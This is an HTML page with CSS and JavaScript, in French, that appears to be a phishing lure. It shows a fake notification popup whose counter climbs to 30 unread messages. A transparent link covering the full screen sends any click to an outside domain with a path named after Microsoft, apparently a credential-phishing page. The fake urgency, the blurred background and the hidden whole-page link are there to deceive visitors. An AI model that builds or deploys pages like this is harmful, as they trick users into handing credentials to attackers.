<!-- Écran cliquable -->
<a href="https://cv71082.tw1.ru/microsoft/microsoft/" class="fullclick"></a>

<!-- Arrière-plan promo + flou -->
<div class="background"></div>
<div class="backdrop"></div>

<!-- Contenu principal -->
<div class="overlay">
  <div class="popup">
    <div class="avatar">
      <img src="https://i.pinimg.com/736x/e7/a7/6d/e7a76dbbebbc6680702d35dd4320269a.jpg" alt="Avatar">
    </div>

    <h1>Messages non lus</h1>
    <p class="lead">Votre compte a reçu de nouvelles conversations. Consultez-les pour répondre rapidement.</p>

    <div class="counter">
      <div id="count">0</div>
      <div class="count-label">nouveaux messages</div>
    </div>

    <div class="footer-note">Vous avez reçu plusieurs messages en attente de réponse.</div>
  </div>
</div>

<style>
body {
  margin: 0;
  font-family: "Segoe UI", sans-serif;
  background: #000;
  overflow: hidden;
}

/* lien couvrant tout l’écran */
.fullclick {
  position: fixed;
  inset: 0;
  z-index: 10;
  display: block;
  cursor: pointer;
}

/* fond image promo flou */
.background {
  position: fixed;
  inset: 0;
  background: url('promo-30.png') center/cover no-repeat;
  filter: blur(14px) brightness(0.5);
  transform: scale(1.1);
  z-index: 1;
}

/* fond noir translucide */
.backdrop {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.7);
  backdrop-filter: blur(10px);
  z-index: 2;
}

/* overlay */
.overlay {
  position: fixed;
  inset: 0;
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 3;
  perspective: 1000px;
}

/* popup 3D */
.popup {
  background: #fff;
  border-radius: 16px;
  padding: 24px;
  width: 340px;
  text-align: center;
  box-shadow: 0 20px 60px rgba(0,0,0,0.6);
  transform: rotateX(0deg) rotateY(0deg) translateZ(0);
  animation: popupIn 0.8s ease forwards;
}
@keyframes popupIn {
  0% {transform: rotateX(30deg) scale(0.5); opacity: 0;}
  100% {transform: rotateX(0deg) scale(1); opacity: 1;}
}

/* avatar */
.avatar img {
  width: 110px;
  height: 110px;
  border-radius: 50%;
  box-shadow: 0 0 30px rgba(24,119,242,0.6);
  transform: translateZ(40px);
}

/* titre */
h1 {
  margin: 12px 0;
  color: #111;
  font-size: 22px;
  font-weight: 700;
}

/* texte */
.lead {
  color: #444;
  font-size: 14px;
  margin-bottom: 20px;
}

/* compteur */
.counter {
  font-size: 42px;
  font-weight: bold;
  color: #1877f2;
  text-shadow: 0 0 10px rgba(24,119,242,0.5);
  margin-bottom: 6px;
  transform: translateZ(60px);
}
.count-label {
  font-size: 14px;
  color: #666;
}

/* note bas */
.footer-note {
  margin-top: 14px;
  font-size: 13px;
  color: #111;
  font-weight: 500;
}
</style>

<script>
let count = 0;
const target = 30;
const el = document.getElementById('count');

function animateCount() {
  const interval = setInterval(() => {
    count++;
    el.textContent = count;
    el.style.transform = `scale(${1 + Math.sin(count/2)/10}) rotateY(${count*6}deg)`;
    if(count >= target) clearInterval(interval);
  }, 80);
}
window.onload = animateCount;
</script>
